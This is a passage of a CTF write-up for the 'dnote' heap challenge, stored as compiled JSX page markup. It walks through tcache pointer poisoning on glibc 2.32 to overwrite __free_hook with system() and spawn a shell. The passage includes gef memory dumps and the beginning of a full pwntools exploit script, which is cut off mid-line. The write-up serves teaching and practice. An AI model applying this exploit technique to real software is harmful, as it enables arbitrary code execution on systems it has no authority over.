code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:'# The chunk we overwrite forward pointer has address at \"heap + 0xb40\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"fake_fw_pointer \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xb40\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__free_hook'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So that we fake the previous chunk into \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" and write it with the chunk from unsorted bin. We will \",(0,n.jsx)(e.code,{children:\"malloc\"}),\" a chunk with size of 0x130 for overwriting:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),\"                 \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Padding to tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x111\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Prev_size and size of tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fake_fw_pointer\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Overwrite forward pointer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x130\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And let\\u2019s check if our forward pointer is correct or not (Address changed):\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/50xg 0x0000000000caca20\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca20:   0x0000000000000000  0x0000000000000141\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca30:   0x00007f43934d0e10  0x00007f43934d0e10    <-- New chunk from unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca40:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca60:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca70:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaa0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacab0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacac0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacad0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacae0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaf0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb00:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb10:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb20:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb30:   0x0000000000000000  0x0000000000000111\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb40:   0x0000000000cac4bc  0x0000000000cac010    <-- Tcache\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb60:   0x0000000000000000  0x00000000000000e1\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    <-- Unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacba0:   0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"It malloc successfully, let\\u2019s check if everything is on the right path or not:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/50xg 0x0000000000caca20\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca20:   0x0000000000000000  0x0000000000000141\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca30:   0x0000000000000000  0x0000000000000000    <-- New chunk from unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca40:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca60:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca70:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaa0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacab0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacac0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacad0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacae0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaf0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb00:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb10:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb20:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb30:   0x0000000000000000  0x0000000000000111\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb40:   0x00007f43934d37cc  0x0000000000ca000a    <-- Forward pointer changed\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb60:   0x0000000000000000  0x00000000000000e1\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    <-- Unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacba0:   0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can see that it\\u2019s the correct position for our fake forward pointer. Let\\u2019s see if it\\u2019s the address of \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" or not:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/check_free_hook_address.png\",alt:\"check_free_hook_address.png\"})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/free_hook_address.png\",alt:\"free_hook_address.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"That\\u2019s correct. Let\\u2019s move on the final stage to get shell!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-4-overwrite-__free_hook-with-system\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-4-overwrite-__free_hook-with-system\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 4: Overwrite \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" with system()\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Now, we just need to malloc 2 chunk with the same size as 0x100 to get the address from tcache and with second malloc, we will overwrite the address of system to that. With the first chunk, we will put the string \",(0,n.jsx)(e.code,{children:\"/bin/sh\"}),' into it so we just reuse this chunk to execute system(\"/bin/sh\"):']}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`add(11, 0x100, b'/bin/sh')\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`add(12, 0x100, p64(libc.sym['system']))\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And finally, we free() chunk index 11 and get shell:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:`free(11)\n`})})}),`\n`,(0,n.jsx)(e.p,{children:\"Full code:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#!/usr/bin/env python3\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./dnote_patched\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./libc-2.32.so\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"ld \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./ld-2.32.so\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` exe\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"log_level \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'debug'\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'>> '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'1'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'size : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'Name : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'>> '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'2'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvuntil\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" drop\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'>> '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'3'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"process\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'./dnote_patched'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# p = connect('chall.nitdgplug.org', 30094)\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 1: Leak main arena address ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token 